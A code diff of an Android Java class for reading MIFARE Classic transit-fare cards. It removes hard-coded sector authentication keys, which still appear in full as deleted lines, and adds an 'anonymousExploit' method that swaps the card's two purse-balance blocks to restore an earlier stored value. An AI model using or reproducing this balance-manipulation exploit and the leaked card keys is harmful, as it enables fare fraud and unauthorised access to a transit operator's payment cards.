@@ -8,15 +8,14 @@ import android.nfc.tech.MifareClassic;
 
 public class VsttrfkCard {
 	
-	public static final byte[][] KEYS_A = {
-		{(byte)0xFC, (byte)0x00, (byte)0x01, (byte)0x87, (byte)0x78, (byte)0xF7 },
-		{(byte)0x02, (byte)0x97, (byte)0x92, (byte)0x7C, (byte)0x0F, (byte)0x77 },
-		{(byte)0x54, (byte)0x72, (byte)0x61, (byte)0x76, (byte)0x65, (byte)0x6C}
-	};
-	public static final byte[][] KEYS_B = {
-		{(byte)0x00, (byte)0x00, (byte)0x0F, (byte)0xFE, (byte)0x24, (byte)0x88},
-		{(byte)0xEE, (byte)0x00, (byte)0x42, (byte)0xF8, (byte)0x88, (byte)0x40},
-		{(byte)0x77, (byte)0x69, (byte)0x74, (byte)0x68, (byte)0x75, (byte)0x73}
+	private static enum BlockId{
+		PURSE ((byte)0x85);
+		
+		private byte id;
+		
+		private BlockId(byte id){
+			this.id = id;
+		}
 	};
 	
 	private final byte[][] data = new byte[64][16]; // 16 sectors each with four lines, 16 bytes per line
@@ -29,10 +28,11 @@ public class VsttrfkCard {
 		if(!mfc.isConnected()){
 			mfc.connect();
 		}
+		IVsttrfkAuthable readAuth = new ReadAuth(mfc);
 		for (int i = 0 ;  i < data.length; i++){
 			
 			// every 4th block is a new sector... try to auth..
-			if ( i % 4 == 0 && !authSectorA(mfc, i/4)){
+			if ( i % 4 == 0 && !readAuth.authToSector(i/4)){
 				throw new IOException("Unable to auth to sector :"+i/4+".");
 			}
 			
@@ -66,42 +66,42 @@ public class VsttrfkCard {
 		return Util.writeBytesToFile(Util.matrixToArray(data));
 		
 	}
+	
+	public boolean anonymousExploit(){
+		final int i = getBlock(BlockId.PURSE);
+		
+		if( Integer.toHexString(data[8][3]).charAt(1) == '8' && data[i+1][0] > data[i+1][0]){
+			return false;
+		}
+		
+		// switch places with the two balance blocks.
+		final byte[] temp = data[i+1];
+		data[i+1] = data[i+2];
+		data[i+2] = temp;
+		return true;
+	}
 
-	public double getBalance() {
-		final byte purseId = (byte)0x85;
+	private int getBlock(BlockId idEnum){
+		final byte purseId = idEnum.id;
 		int i = 0;
 		while(data[i][0] != purseId && i < data.length){
 			i++;
 		}
-		int value = data[i+1][0] > data[i+2][0] ? 
-				Util.byteToInt(new byte[]{data[i+1][5],data[i+1][4]},0) : 
-				Util.byteToInt(new byte[]{data[i+2][5],data[i+2][4]},0);
-		return value/25.0;
-	}
-
-	public static boolean authSectorB(MifareClassic mfcDevice, int sector) throws IOException{
-		// first three always the first key.
-		int j = sector / 4 < 3 ? 0 : 1; 
-		// skip this if at sector 3.
-		while (!mfcDevice.authenticateSectorWithKeyB(sector, KEYS_B[j++])) {
-			if (j >= KEYS_B.length) {
-				// no a key worked..
-				return false;
-			}
-		}
-		return true;
+		return i;
 	}
 	
-	public static boolean authSectorA(MifareClassic mfcDevice, int sector) throws IOException{
-		// first three always the first key.
-		int j = sector / 4 < 3 ? 0 : 1; 
-		// skip this if at sector 3.
-		while (!mfcDevice.authenticateSectorWithKeyA(sector, KEYS_A[j++])) {
-			if (j >= KEYS_A.length) {
-				// no a key worked..
-				return false;
-			}
+	public double getBalance() {
+		final int i = getBlock(BlockId.PURSE);
+		int value = 0;
+		if( Integer.toHexString(data[8][3]).charAt(1) == '8'){
+			value = Util.byteToInt(new byte[]{data[i+1][5],data[i+1][4]},0);
+		} else if( Integer.toHexString(data[8][3]).charAt(1) == '4') {	 
+			value = Util.byteToInt(new byte[]{data[i+2][5],data[i+2][4]},0);
 		}
-		return true;
+//		Old method. May not work since highest transaction no. isn't always current balance
+//		final int value = data[i+1][0] > data[i+2][0] ? 
+//				Util.byteToInt(new byte[]{data[i+1][5],data[i+1][4]},0) : 
+//				Util.byteToInt(new byte[]{data[i+2][5],data[i+2][4]},0);
+		return value/25.0;
 	}
 }
